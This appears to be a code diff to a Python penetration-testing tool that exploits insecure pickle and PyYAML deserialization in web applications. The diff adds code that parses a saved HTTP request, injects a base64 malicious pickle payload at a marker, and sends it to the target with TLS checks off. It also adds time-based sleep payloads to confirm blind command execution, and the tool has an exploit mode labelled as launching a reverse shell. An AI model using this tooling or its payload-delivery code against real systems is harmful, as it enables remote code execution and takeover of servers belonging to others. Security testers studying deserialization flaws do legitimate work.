@@ -4,8 +4,11 @@ import os
 import pickle
 import pickletools
 
+import requests
+from requests import Request
+requests.packages.urllib3.disable_warnings()
+
 import utils
-from utils import *
 
 g_args = None
 
@@ -19,9 +22,9 @@ def parse_args():
     subparsers = parent_parser.add_subparsers(dest='subparser_name')
 
     # create the parser for the verify functionality
-    verify_parser = subparsers.add_parser('verify', help="Verify that the string is base64 serialized python object")
+    verify_parser = subparsers.add_parser('verify', help="Verify that the string is base64 serialized python pickle object")
     # verify_parser.set_defaults(subcommand='verify')
-    verify_parser.add_argument('--object', required=True, help="Object to verify(base64?)")
+    verify_parser.add_argument('--object', required=True, help="Object to verify(base64)") #todo raw?
     verify_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
     verify_parser.add_argument('--unsafe', required=False, action='store_true',
                                help='Use dangerous deserialization functions to verify if the string is serialized object.'
@@ -39,6 +42,7 @@ def parse_args():
     confirm_vuln_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to confirm vulnerability")
     confirm_vuln_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
     confirm_vuln_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
+    confirm_vuln_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
 
     # create the parser for the exploit functionality
     exploit_parser = subparsers.add_parser('exploit', help="Try to exploit the vulnerability and execute reverse shell.")
@@ -46,6 +50,7 @@ def parse_args():
     exploit_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to exploit vulnerability")
     exploit_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
     exploit_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
+    exploit_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
 
     # parse the arguments
     parsed_args = parent_parser.parse_args()
@@ -65,7 +70,7 @@ def parse_args():
         exit(1)
 
 
-def verify():
+def verify() -> bool:
     print("[+] Using verify module")
 
     base64_encoded_object = str(g_args.object)
@@ -123,7 +128,7 @@ def verify():
 
 
 
-def generate_payload(revshell_cmd=None): # todo: nadodati na postojeci pickle objekt
+def generate_payload(revshell_cmd=None) -> str: # todo: nadodati na postojeci pickle objekt
     print("[+] Using generate-payload module")
 
     cmd = None
@@ -152,9 +157,86 @@ def generate_payload(revshell_cmd=None): # todo: nadodati na postojeci pickle ob
     return base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8")
 
 
+def read_file(path: str) -> list[str]:
+    try:
+        req_file = open(path, 'r')
+        print("[+] Using request file: ", path)
+    except Exception as e:
+        print("[+] Error opening file: ", path)  # print_red
+        exit(1)
+
+    lines = req_file.readlines()
+    req_file.close()
+    return lines
+
+
+def parse_request_and_insert_payload(req_lines: list[str], payload: str, custom_marker=None, http=False):
+    method = None
+    url = None
+    host = None
+    headers = dict()
+    data = None
+    lines = None
+
+    if custom_marker is None:
+        lines = [l.replace('inject_here', payload) for l in req_lines]
+    else:
+        lines = [l.replace(custom_marker, payload) for l in req_lines]
+
+    first_line = lines.pop(0)
+    method = first_line.split()[0].strip()
+    uri = first_line.split()[1].strip()
+
+    for idx, line in enumerate(lines):
+        if line.startswith('\n'):
+            data = "".join(lines[idx + 1:])
+            break
+        else:
+            header_name = line.split(':')[0].strip()
+            header_value = line.split(':')[1].strip()
+            headers.update({header_name: header_value})
+            if line.startswith("Host:"):
+                host = line.split(':')[1].strip()
+
+    # assumes https by default
+    if http:
+        url = "http://" + host + uri
+    else:
+        url = "https://" + host + uri
+
+    return method, url, headers, data
+
 
 def confirm_vuln():
     print("[+] Using confirm-vuln module")
+
+    request = read_file(g_args.request)
+
+    proxy_servers = None
+    if g_args.proxy is not None:
+        proxy_servers = {
+            'http': g_args.proxy,
+            'https': g_args.proxy,
+        }
+
+    for win_payload in utils.sleep_win:
+
+        #TODO: napraviti len(utils.sleep_win) threadova/procesa tako da cjela petlja traje koliko i najsporiji sleep a ne suma svih
+
+        (method, url, headers, data) = parse_request_and_insert_payload(request, win_payload, custom_marker=g_args.marker, http=g_args.http)
+        req = Request(method=method, url=url, headers=headers, data=data)
+        prepared_req = req.prepare()
+        if proxy_servers is not None:
+            response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+        else:
+            response = requests.Session().send(prepared_req, verify=False)
+
+        print("[+] Response time:", response.elapsed.total_seconds()) #microseconds?
+
+
+
+
+
 
 
 def exploit():
